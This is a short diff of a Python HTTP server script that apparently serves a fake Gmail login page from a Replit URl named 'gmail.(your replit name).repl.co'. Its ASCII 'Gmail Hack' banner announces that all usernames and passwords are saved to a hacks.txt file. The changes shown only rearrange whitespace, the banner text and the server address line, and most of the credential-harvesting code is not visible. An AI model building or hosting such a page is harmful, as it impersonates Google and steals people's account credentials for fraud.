@@ -39,6 +39,8 @@ class RequestHandler(BaseHTTPRequestHandler):
             self.end_headers()
         else:
             self.send_error(404)
+         
+
 
 def run():
     port = 8000
@@ -47,17 +49,17 @@ def run():
 | |  __ _ __ ___   __ _ _| |
 | | |_ | '_ ` _ \ / _` | | |
 | |__| | | | | | | (_| | | |
- \_____|_| |_| |_|\__,_|_|_|          All usernames and passwords saved to    
-| |  | |          | |                 The hacks.txt file. Enjoy!
-| |__| | __ _  ___| | __
+ \_____|_| |_| |_|\__,_|_|_|          All usernames and                                               Passwords saved to
+| |  | |          | |                 The hacks.txt file
+| |__| | __ _  ___| | __              Enjoy!
 |  __  |/ _` |/ __| |/ /
 | |  | | (_| | (__|   < 
 |_|  |_|\__,_|\___|_|\_\
                         
                         
   Started At url https://gmail.(your replit name).repl.co/                          
-''') 
-
+''')
+    server_address = ('', port)
     httpd = HTTPServer(server_address, RequestHandler)
     httpd.serve_forever()
 
